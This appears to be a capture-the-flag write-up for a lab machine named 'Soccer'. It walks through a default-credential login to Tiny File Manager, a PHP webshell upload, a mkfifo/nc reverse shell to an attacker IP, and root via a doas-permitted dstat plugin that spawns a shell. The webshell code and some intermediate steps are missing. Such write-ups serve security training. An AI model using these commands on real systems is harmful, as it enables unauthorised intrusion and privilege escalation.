This webpage looks like simple management system. You will find tiny file manager version on inspector with searching keyword 'version'. A reaserch for the keyword 'tiny file manager default credentials', you can find admin : admin@123 as a default credentials.

On the upload/ page, we can upload arbitrary files. Also, the webpage uses php. Therefore, we can try uploading php webshell.

I used this simple webshell code.

<html>

An only thing you have to do is to create webshell.php file and upload it. On top right of the page, you can see a button 'Create Item'. You simply select file and put create now button.

After uploading the file, open it and send reverse shell code. We aren't be able to use bash rev shell with www-data user oftenly, therefore, establish reverse shell with code below.

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f

Then, you would receive reverse shell.

Foothold

The www-data user doesn't have interesting files. Therefore, we have to use another vector for next steps.

This box hosts server with nginx, so nginx/ folder might have key information.

With little research, we can find site-enabled folder under the nginx folder, and there is a folder named soc-player. 

echo 'TAEGET_IP soc-player.soccer.htb' | sudo tee -a /etc/hosts

This page is basically the same with previous page, but it includes additional options. On the tickets page, we can check if the input ticket number is valid one.

Checking the source code of the site reveals that this function is based on a WebSocket server running on port 9091.

There is an unfamiliar executable 'doas'. With a little researches, this wiki tells us it requires configuration file. But we cannot find conf file under the /etc dir, so let's use find command.

player@soccer:~$ find / -name doas.conf 2>/dev/null
/usr/local/etc/doas.conf
player@soccer:~$ cat /usr/local/etc/doas.conf 
permit nopass player as root cmd /usr/bin/dstat

From this output, we have to use doas via dstat file. Fortunately, GTFObins has the way to make use of dstat for privilege escalation.

We simply follow this instruction. Notice : we don't have sudo privilege, so we need to designate full path.

echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
doas /usr/bin/dstat --xxx

You'll get root id.
